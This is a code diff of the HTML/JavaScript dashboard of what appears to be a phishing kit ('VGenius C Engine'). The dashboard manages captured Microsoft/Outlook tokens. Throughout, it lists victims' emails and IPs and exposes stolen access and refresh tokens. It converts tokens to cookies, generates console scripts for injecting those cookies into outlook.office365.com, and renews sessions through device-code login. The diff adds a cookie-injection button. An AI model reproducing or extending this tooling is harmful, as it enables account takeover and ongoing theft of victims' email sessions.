@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captured Tokens – VGenius C Engine</title>
+    <title>Captured Tokens - VGenius C Engine</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="assets/css/user.css">
     <style>
@@ -24,12 +24,24 @@
             border-color: var(--accent);
             color: var(--accent);
         }
-        .action-btn.script-btn { border-color: rgba(0,255,204,0.3); }
-        .action-btn.script-btn:hover { background: rgba(0,255,204,0.1); }
-        .action-btn.renew-btn { border-color: rgba(59,130,246,0.3); }
-        .action-btn.renew-btn:hover { background: rgba(59,130,246,0.1); }
-        .action-btn.delete-btn { border-color: rgba(239,68,68,0.3); }
-        .action-btn.delete-btn:hover { background: rgba(239,68,68,0.1); }
+        .action-btn.script-btn {
+            border-color: rgba(0,255,204,0.3);
+        }
+        .action-btn.script-btn:hover {
+            background: rgba(0,255,204,0.1);
+        }
+        .action-btn.renew-btn {
+            border-color: rgba(59,130,246,0.3);
+        }
+        .action-btn.renew-btn:hover {
+            background: rgba(59,130,246,0.1);
+        }
+        .action-btn.delete-btn {
+            border-color: rgba(239,68,68,0.3);
+        }
+        .action-btn.delete-btn:hover {
+            background: rgba(239,68,68,0.1);
+        }
         .action-group {
             display: flex;
             gap: 4px;
@@ -52,8 +64,12 @@
                 <span class="badge" id="tokenCount">0 Total</span>
             </div>
             <div style="display:flex;gap:8px;">
-                <button class="btn-outline" onclick="openExportModal()"><i class="fas fa-download"></i> Export</button>
-                <button class="btn-outline" onclick="openChartModal()"><i class="fas fa-chart-line"></i> Chart</button>
+                <button class="btn-outline" onclick="openExportModal()">
+                    <i class="fas fa-download"></i> Export
+                </button>
+                <button class="btn-outline" onclick="openChartModal()">
+                    <i class="fas fa-chart-line"></i> Chart
+                </button>
             </div>
         </div>
 
@@ -64,7 +80,9 @@
                 <option value="oldest">Oldest first</option>
             </select>
             <button class="btn-accent-sm" onclick="loadTokens()">Apply</button>
-            <button class="btn-outline" onclick="toggleManualConvert()" style="margin-left:auto;"><i class="fas fa-exchange-alt"></i> Convert Token to Cookies</button>
+            <button class="btn-outline" onclick="toggleManualConvert()" style="margin-left:auto;">
+                <i class="fas fa-exchange-alt"></i> Convert Token to Cookies
+            </button>
         </div>
 
         <!-- Manual Cookie Conversion -->
@@ -72,7 +90,9 @@
             <div class="card" style="padding:16px;border:1px dashed var(--border);">
                 <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;">
                     <i class="fas fa-info-circle" style="color:var(--accent);"></i>
-                    <span style="font-size:12px;color:var(--muted);">Convert a raw access token to browser cookies. Paste an access token from token-mode capture.</span>
+                    <span style="font-size:12px;color:var(--muted);">
+                        Convert a raw access token to browser cookies. Paste an access token from token-mode capture.
+                    </span>
                 </div>
                 <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;">
                     <div class="form-group" style="margin-bottom:0;">
@@ -89,13 +109,19 @@
                             <option value="outlook">Outlook</option>
                         </select>
                     </div>
-                    <button class="btn-accent-sm" onclick="convertManualToken()" style="height:36px;white-space:nowrap;"><i class="fas fa-exchange-alt"></i> Convert</button>
+                    <button class="btn-accent-sm" onclick="convertManualToken()" style="height:36px;white-space:nowrap;">
+                        <i class="fas fa-exchange-alt"></i> Convert
+                    </button>
                 </div>
                 <div id="manualConvertResult" style="margin-top:12px;display:none;">
                     <div style="background:rgba(0,255,204,0.06);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:12px;">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
-                            <span style="font-size:11px;font-weight:600;color:var(--accent);"><i class="fas fa-check-circle"></i> Conversion Successful</span>
-                            <button class="btn-outline" style="padding:4px 10px;font-size:10px;" onclick="copyManualCookies()"><i class="fas fa-copy"></i> Copy Cookies</button>
+                            <span style="font-size:11px;font-weight:600;color:var(--accent);">
+                                <i class="fas fa-check-circle"></i> Conversion Successful
+                            </span>
+                            <button class="btn-outline" style="padding:4px 10px;font-size:10px;" onclick="copyManualCookies()">
+                                <i class="fas fa-copy"></i> Copy Cookies
+                            </button>
                         </div>
                         <textarea id="manualCookiesOutput" readonly style="width:100%;min-height:80px;padding:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:6px;color:var(--accent);font-size:10px;resize:vertical;font-family:'Courier New',monospace;outline:none;"></textarea>
                         <div style="margin-top:8px;font-size:10px;color:var(--muted);line-height:1.5;">
@@ -112,10 +138,20 @@
         <div class="card" style="overflow:hidden;">
             <table class="tokens-table">
                 <thead>
-                    <tr><th>#</th><th>Email</th><th>Date/Time</th><th>IP Address</th><th>Token Type</th><th>Last Renew</th><th>Actions</th></tr>
+                    <tr>
+                        <th>#</th>
+                        <th>Email</th>
+                        <th>Date/Time</th>
+                        <th>IP Address</th>
+                        <th>Token Type</th>
+                        <th>Last Renew</th>
+                        <th>Actions</th>
+                    </tr>
                 </thead>
                 <tbody id="tokensTableBody">
-                    <tr><td colspan="7" class="empty-state">No tokens captured yet.</td></tr>
+                    <tr>
+                        <td colspan="7" class="empty-state">No tokens captured yet.</td>
+                    </tr>
                 </tbody>
             </table>
         </div>
@@ -127,7 +163,9 @@
         <div class="modal-card" style="max-width:700px;">
             <div class="modal-header">
                 <span class="modal-title">Token Details</span>
-                <button class="modal-close" onclick="closeDetailModal()"><i class="fas fa-times"></i></button>
+                <button class="modal-close" onclick="closeDetailModal()">
+                    <i class="fas fa-times"></i>
+                </button>
             </div>
             <div id="detailContent" style="padding:16px;"></div>
         </div>
@@ -137,22 +175,33 @@
     <div class="modal-overlay" id="cookieScriptModal" style="display:none;" onclick="if(event.target===this)closeCookieScriptModal()">
         <div class="modal-card" style="max-width:550px;">
             <div class="modal-header">
-                <span class="modal-title"><i class="fas fa-code" style="color:var(--accent);margin-right:8px;"></i>Cookie Script Generator</span>
-                <button class="modal-close" onclick="closeCookieScriptModal()"><i class="fas fa-times"></i></button>
+                <span class="modal-title">
+                    <i class="fas fa-code" style="color:var(--accent);margin-right:8px;"></i>
+                    Cookie Script Generator
+                </span>
+                <button class="modal-close" onclick="closeCookieScriptModal()">
+                    <i class="fas fa-times"></i>
+                </button>
             </div>
             <div style="padding:16px;">
                 <div style="background:rgba(0,255,204,0.08);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:14px;margin-bottom:16px;font-size:12px;line-height:1.6;color:var(--text-main);">
-                    <strong style="color:var(--accent);margin-bottom:8px;display:block;"><i class="fas fa-clipboard-list"></i> Instructions:</strong>
+                    <strong style="color:var(--accent);margin-bottom:8px;display:block;">
+                        <i class="fas fa-clipboard-list"></i> Instructions:
+                    </strong>
                     1. Navigate to <a href="https://outlook.office365.com" target="_blank" style="color:var(--accent);text-decoration:underline;">outlook.office365.com</a> in Chrome/Edge<br>
                     2. When prompted to sign in, click <strong>"Cancel"</strong> or <strong>"No"</strong><br>
-                    3. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> → Go to Console tab<br>
+                    3. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> -> Go to Console tab<br>
                     4. Paste the script below and press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">Enter</kbd><br>
                     5. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F5</kbd> to refresh the page
                 </div>
                 <textarea id="cookieScriptOutput" readonly style="width:100%;min-height:180px;font-family:'Courier New',monospace;font-size:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--accent);padding:12px;resize:vertical;line-height:1.5;"></textarea>
                 <div style="display:flex;gap:8px;margin-top:12px;">
-                    <button class="btn-accent-sm" style="flex:1;padding:10px;" onclick="copyScriptOutput()"><i class="fas fa-copy"></i> Copy Script</button>
-                    <button class="btn-outline" style="flex:1;padding:10px;" onclick="closeCookieScriptModal()"><i class="fas fa-times"></i> Cancel</button>
+                    <button class="btn-accent-sm" style="flex:1;padding:10px;" onclick="copyScriptOutput()">
+                        <i class="fas fa-copy"></i> Copy Script
+                    </button>
+                    <button class="btn-outline" style="flex:1;padding:10px;" onclick="closeCookieScriptModal()">
+                        <i class="fas fa-times"></i> Cancel
+                    </button>
                 </div>
             </div>
         </div>
@@ -163,13 +212,19 @@
         <div class="modal-card" style="max-width:400px;text-align:center;">
             <div class="modal-header">
                 <span class="modal-title">Export Tokens</span>
-                <button class="modal-close" onclick="closeExportModal()"><i class="fas fa-times"></i></button>
+                <button class="modal-close" onclick="closeExportModal()">
+                    <i class="fas fa-times"></i>
+                </button>
             </div>
             <div style="padding:20px 0;">
                 <p style="font-size:13px;color:var(--muted);margin-bottom:20px;">Choose export option:</p>
                 <div style="display:flex;flex-direction:column;gap:10px;">
-                    <button class="btn-accent-sm" style="width:100%;padding:14px;" onclick="exportTokens()"><i class="fas fa-download"></i> Export Only (JSON)</button>
-                    <button class="btn-danger-sm" style="width:100%;padding:14px;" onclick="confirmExportAndDelete()"><i class="fas fa-trash"></i> Export + Delete All</button>
+                    <button class="btn-accent-sm" style="width:100%;padding:14px;" onclick="exportTokens()">
+                        <i class="fas fa-download"></i> Export Only (JSON)
+                    </button>
+                    <button class="btn-danger-sm" style="width:100%;padding:14px;" onclick="confirmExportAndDelete()">
+                        <i class="fas fa-trash"></i> Export + Delete All
+                    </button>
                 </div>
             </div>
         </div>
@@ -180,7 +235,9 @@
         <div class="modal-card" style="max-width:900px;">
             <div class="modal-header">
                 <span class="modal-title">Token Trends</span>
-                <button class="modal-close" onclick="closeChartModal()"><i class="fas fa-times"></i></button>
+                <button class="modal-close" onclick="closeChartModal()">
+                    <i class="fas fa-times"></i>
+                </button>
             </div>
             <div style="padding:16px;">
                 <div style="display:flex;gap:4px;margin-bottom:20px;flex-wrap:wrap;" id="chartTabs">
@@ -206,7 +263,6 @@
         let currentDetailId = null;
         let chartInstance = null;
         let currentChartDays = 14;
-
         initShared('tokens');
 
         async function loadTokens(page = 1) {
@@ -223,21 +279,40 @@
             tbody.innerHTML = data.tokens.map((t, i) => `
                 <tr class="token-row">
                     <td>${(page-1)*30 + i + 1}</td>
-                    <td style="font-weight:600;">${t.email || '—'}</td>
+                    <td style="font-weight:600;">${t.email || '\u2014'}</td>
                     <td style="font-size:11px;color:var(--muted);">${formatDate(t.created_at)}</td>
-                    <td style="font-size:11px;font-family:var(--font-heading);">${t.ip_address || '—'}</td>
-                    <td><span class="badge" style="font-size:9px;">${t.token_type === 'cookie' ? '🍪 Cookie' : '🔑 Token'}</span></td>
-                    <td style="font-size:11px;color:var(--muted);">${t.last_renewed ? formatDate(t.last_renewed) : '—'}</td>
+                    <td style="font-size:11px;font-family:var(--font-heading);">${t.ip_address || '\u2014'}</td>
+                    <td>
+                        <span class="badge" style="font-size:9px;">
+                            ${t.token_type === 'cookie' ? '\uD83C\uDF6A Cookie' : '\uD83D\uDD11 Token'}
+                        </span>
+                    </td>
+                    <td style="font-size:11px;color:var(--muted);">${t.last_renewed ? formatDate(t.last_renewed) : '\u2014'}</td>
                     <td class="actions-cell">
                         <div class="action-group">
-                            <button class="action-btn script-btn" onclick="openDetailModal(${t.id})" title="View Details"><i class="fas fa-eye"></i></button>
-                            <button class="action-btn script-btn" onclick="generateCookieScript(${t.id})" title="Generate Cookie Script"><i class="fas fa-code"></i> Script</button>
-                            <button class="action-btn renew-btn" onclick="renewCookies(${t.id}, this)" title="Renew Cookies"><i class="fas fa-rotate"></i> Refresh</button>
-                            <button class="action-btn delete-btn" onclick="deleteToken(${t.id})" title="Delete Token"><i class="fas fa-trash"></i></button>
+                            <button class="action-btn script-btn" onclick="openDetailModal(${t.id})" title="View Details">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                            <button class="action-btn script-btn" onclick="injectCookie(${t.id})" title="Inject Cookie">
+                                <i class="fas fa-plug"></i>
+                            </button>
+                            <button class="action-btn script-btn" onclick="generateCookieScript(${t.id})" title="Generate Cookie Script">
+                                <i class="fas fa-code"></i> Script
+                            </button>
+                            <button class="action-btn renew-btn" onclick="renewCookies(${t.id}, this)" title="Renew Cookies">
+                                <i class="fas fa-rotate"></i> Refresh
+                            </button>
+                            <button class="action-btn delete-btn" onclick="deleteToken(${t.id})" title="Delete Token">
+                                <i class="fas fa-trash"></i>
+                            </button>
                         </div>
                     </td>
                 </tr>
             `).join('');
+        }
+
+        function injectCookie(id) {
+            window.open(`${API}/tokens/inject/page/${id}`, '_blank', 'width=900,height=700');
         }
 
         async function openDetailModal(id) {
@@ -246,14 +321,42 @@
             const t = await res.json();
             document.getElementById('detailContent').innerHTML = `
                 <div style="display:grid;gap:12px;">
-                    <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value">${t.email || '—'}</span></div>
-                    <div class="detail-row"><span class="detail-label">Token Type</span><span class="detail-value">${t.token_type === 'cookie' ? '🍪 Cookie Capture' : '🔑 Token Capture'}</span></div>
-                    <div class="detail-row"><span class="detail-label">IP Address</span><span class="detail-value">${t.ip_address || '—'}</span></div>
-                    <div class="detail-row"><span class="detail-label">User Agent</span><span class="detail-value" style="font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;">${(t.user_agent||'').substring(0,80)}</span></div>
-                    <div class="detail-row"><span class="detail-label">Captured</span><span class="detail-value">${formatDate(t.created_at)}</span></div>
-                    <div class="detail-row"><span class="detail-label">Expires</span><span class="detail-value">${t.expiration ? formatDate(t.expiration) : '—'}</span></div>
-                    <div class="detail-row"><span class="detail-label">Last Renewed</span><span class="detail-value">${t.last_renewed ? formatDate(t.last_renewed) : '—'}</span></div>
-                    <div class="detail-row"><span class="detail-label">Renewal Count</span><span class="detail-value">${t.renewal_count || 0}</span></div>
+                    <div class="detail-row">
+                        <span class="detail-label">Email</span>
+                        <span class="detail-value">${t.email || '\u2014'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Token Type</span>
+                        <span class="detail-value">
+                            ${t.token_type === 'cookie' ? '\uD83C\uDF6A Cookie Capture' : '\uD83D\uDD11 Token Capture'}
+                        </span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">IP Address</span>
+                        <span class="detail-value">${t.ip_address || '\u2014'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">User Agent</span>
+                        <span class="detail-value" style="font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;">
+                            ${(t.user_agent||'').substring(0,80)}
+                        </span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Captured</span>
+                        <span class="detail-value">${formatDate(t.created_at)}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Expires</span>
+                        <span class="detail-value">${t.expiration ? formatDate(t.expiration) : '\u2014'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Last Renewed</span>
+                        <span class="detail-value">${t.last_renewed ? formatDate(t.last_renewed) : '\u2014'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Renewal Count</span>
+                        <span class="detail-value">${t.renewal_count || 0}</span>
+                    </div>
                     <div style="margin-top:8px;">
                         <label class="detail-label" style="display:block;margin-bottom:4px;">Notes</label>
                         <textarea id="notesInput" onchange="saveNotes(${t.id})" style="width:100%;padding:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--text-main);font-size:12px;resize:vertical;min-height:60px;outline:none;">${t.notes || ''}</textarea>
@@ -261,19 +364,38 @@
                     <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
                         ${t.cookies ? '<button class="btn-accent-sm" onclick="generateCookieScript('+t.id+')"><i class="fas fa-code"></i> Cookie Script</button>' : ''}
                         ${t.token_type === 'cookie' ? '<button class="btn-outline" onclick="renewCookies('+t.id+', null)"><i class="fas fa-rotate"></i> Renew</button>' : ''}
-                        <button class="btn-outline" onclick="copyToClipboard('${t.access_token || ''}')"><i class="fas fa-copy"></i> Access Token</button>
-                        <button class="btn-outline" onclick="copyToClipboard('${t.refresh_token || ''}')"><i class="fas fa-copy"></i> Refresh Token</button>
+                        <button class="btn-outline" onclick="copyToClipboard('${t.access_token || ''}')">
+                            <i class="fas fa-copy"></i> Access Token
+                        </button>
+                        <button class="btn-outline" onclick="copyToClipboard('${t.refresh_token || ''}')">
+                            <i class="fas fa-copy"></i> Refresh Token
+                        </button>
                     </div>
                 </div>
             `;
             document.getElementById('detailModal').style.display = 'flex';
         }
 
-        function closeDetailModal() { document.getElementById('detailModal').style.display = 'none'; currentDetailId = null; }
-        function openExportModal() { document.getElementById('exportModal').style.display = 'flex'; }
-        function closeExportModal() { document.getElementById('exportModal').style.display = 'none'; }
-        function openCookieScriptModal() { document.getElementById('cookieScriptModal').style.display = 'flex'; }
-        function closeCookieScriptModal() { document.getElementById('cookieScriptModal').style.display = 'none'; }
+        function closeDetailModal() {
+            document.getElementById('detailModal').style.display = 'none';
+            currentDetailId = null;
+        }
+
+        function openExportModal() {
+            document.getElementById('exportModal').style.display = 'flex';
+        }
+
+        function closeExportModal() {
+            document.getElementById('exportModal').style.display = 'none';
+        }
+
+        function openCookieScriptModal() {
+            document.getElementById('cookieScriptModal').style.display = 'flex';
+        }
+
+        function closeCookieScriptModal() {
+            document.getElementById('cookieScriptModal').style.display = 'none';
+        }
 
         async function exportTokens() {
             try {
@@ -371,24 +493,18 @@
             try {
                 const res = await fetch(`${API}/tokens/${id}/renew`, { method: 'POST', headers: authHeaders() });
                 const data = await res.json();
-                
                 if (data.success && data.user_code) {
-                    // Show the renewal code to the user
                     showToast(`Renewal code: ${data.user_code}. Opening Microsoft login...`, false, 10000);
-                    
-                    // Copy code and open Microsoft login popup
                     await navigator.clipboard.writeText(data.user_code);
-                    
-                    // Open Microsoft login in popup
                     const popup = window.open('https://microsoft.com/devicelogin', 'vgRenew', 'width=500,height=600');
-                    
                     if (!popup || popup.closed) {
                         showToast('Popup blocked. Please allow popups and click Renew again.', true);
-                        if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.innerHTML = originalText;
+                        }
                         return;
                     }
-                    
-                    // Poll for completion
                     const pollInterval = setInterval(async () => {
                         try {
                             if (popup.closed) {
@@ -396,42 +512,51 @@
                                 showToast('Renewal popup closed. Refreshing tokens...');
                                 loadTokens();
                                 if (currentDetailId) openDetailModal(currentDetailId);
-                                if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                                if (btn) {
+                                    btn.disabled = false;
+                                    btn.innerHTML = originalText;
+                                }
                                 return;
                             }
-                            
-                            // Check if token was updated (user completed auth)
                             const tokenRes = await fetch(`${API}/tokens/${id}`, { headers: authHeaders() });
                             const tokenData = await tokenRes.json();
-                            
                             if (tokenData.last_renewed && tokenData.cookies) {
                                 clearInterval(pollInterval);
                                 popup.close();
                                 showToast('✅ Session renewed successfully!');
                                 loadTokens();
                                 if (currentDetailId) openDetailModal(currentDetailId);
-                                if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                                if (btn) {
+                                    btn.disabled = false;
+                                    btn.innerHTML = originalText;
+                                }
                             }
                         } catch (e) {
                             // Silent - continue polling
                         }
                     }, 2000);
-                    
-                    // Timeout after 5 minutes
                     setTimeout(() => {
                         clearInterval(pollInterval);
                         if (!popup.closed) popup.close();
                         showToast('Renewal timeout. Please try again.', true);
-                        if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.innerHTML = originalText;
+                        }
                     }, 300000);
-                    
                 } else {
                     showToast('Renewal failed: ' + (data.error || 'unknown'), true);
-                    if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerHTML = originalText;
+                    }
                 }
             } catch(e) {
                 showToast('Renewal failed: ' + e.message, true);
-                if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = originalText;
+                }
             }
         }
 
@@ -450,11 +575,9 @@
             const templateType = document.getElementById('manualTemplateType').value;
             const resultDiv = document.getElementById('manualConvertResult');
             const output = document.getElementById('manualCookiesOutput');
-
             if (!accessToken) {
                 return showToast('Please paste an access token', true);
             }
-
             try {
                 const res = await fetch(`${API}/tokens/convert-cookie`, {
                     method: 'POST',
@@ -462,7 +585,6 @@
                     body: JSON.stringify({ access_token: accessToken, template_type: templateType })
                 });
                 const data = await res.json();
-
                 if (data.success) {
                     output.value = data.cookies;
                     resultDiv.style.display = 'block';
@@ -487,20 +609,28 @@
             navigator.clipboard.writeText(text).then(() => showToast('Script copied to clipboard'));
         }
 
-        function openChartModal() { 
-            document.getElementById('chartModal').style.display = 'flex'; 
-            loadChart(currentChartDays || 14); 
+        function openChartModal() {
+            document.getElementById('chartModal').style.display = 'flex';
+            loadChart(currentChartDays || 14);
         }
-        function closeChartModal() { 
-            document.getElementById('chartModal').style.display = 'none'; 
-            if (chartInstance) { chartInstance.destroy(); chartInstance = null; } 
+
+        function closeChartModal() {
+            document.getElementById('chartModal').style.display = 'none';
+            if (chartInstance) {
+                chartInstance.destroy();
+                chartInstance = null;
+            }
         }
-        function setChartTab(btn, days) { 
+
+        function setChartTab(btn, days) {
             currentChartDays = days;
-            document.querySelectorAll('#chartTabs button').forEach(b => { b.style.borderColor = ''; b.style.background = ''; });
+            document.querySelectorAll('#chartTabs button').forEach(b => {
+                b.style.borderColor = '';
+                b.style.background = '';
+            });
             btn.style.borderColor = 'var(--accent)';
             btn.style.background = 'rgba(0,255,204,0.1)';
-            loadChart(days); 
+            loadChart(days);
         }
 
         async function loadChart(days) {
@@ -508,16 +638,19 @@
                 const res = await fetch(`${API}/analytics/tokens/daily?days=${days}`, { headers: authHeaders() });
                 const data = await res.json();
                 if (!data || !data.length) {
-                    document.getElementById('chartInsights').innerHTML = '<div style="grid-column:1/-1;text-align:center;color:var(--muted);padding:40px;"><i class="fas fa-chart-line" style="font-size:32px;margin-bottom:12px;opacity:0.3;"></i><p>No data available for this period</p></div>';
+                    document.getElementById('chartInsights').innerHTML = `
+                        <div style="grid-column:1/-1;text-align:center;color:var(--muted);padding:40px;">
+                            <i class="fas fa-chart-line" style="font-size:32px;margin-bottom:12px;opacity:0.3;"></i>
+                            <p>No data available for this period</p>
+                        </div>
+                    `;
                     return;
                 }
                 const ctx = document.getElementById('tokenChart');
                 if (!ctx) return;
                 if (chartInstance) chartInstance.destroy();
-                
                 const labels = data.map(d => d.date);
                 const values = data.map(d => d.count || 0);
-                
                 chartInstance = new Chart(ctx.getContext('2d'), {
                     type: 'line',
                     data: {
@@ -564,12 +697,10 @@
                         }
                     }
                 });
-                
                 const total = values.reduce((s, v) => s + v, 0);
                 const done = data.reduce((s, d) => s + (d.done_count || 0), 0);
                 const unique = data.reduce((s, d) => s + (d.unique_ips || 0), 0);
                 const conversion = total > 0 ? (done/total*100).toFixed(1) : 0;
-                
                 document.getElementById('chartInsights').innerHTML = `
                     <div class="counter-box">
                         <div class="counter-value" style="color:var(--accent);">${total}</div>
@@ -590,19 +721,23 @@
                 `;
             } catch(e) {
                 console.error('Chart load error:', e);
-                document.getElementById('chartInsights').innerHTML = '<div style="grid-column:1/-1;text-align:center;color:var(--danger);">Failed to load chart data</div>';
+                document.getElementById('chartInsights').innerHTML = `
+                    <div style="grid-column:1/-1;text-align:center;color:var(--danger);">
+                        Failed to load chart data
+                    </div>
+                `;
             }
         }
 
-        document.addEventListener('keydown', (e) => { 
-            if (e.key === 'Escape') { 
-                closeDetailModal(); 
-                closeExportModal(); 
-                closeCookieScriptModal(); 
-                closeChartModal(); 
-            } 
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeDetailModal();
+                closeExportModal();
+                closeCookieScriptModal();
+                closeChartModal();
+            }
         });
-        
+
         loadTokens();
     </script>
 </body>
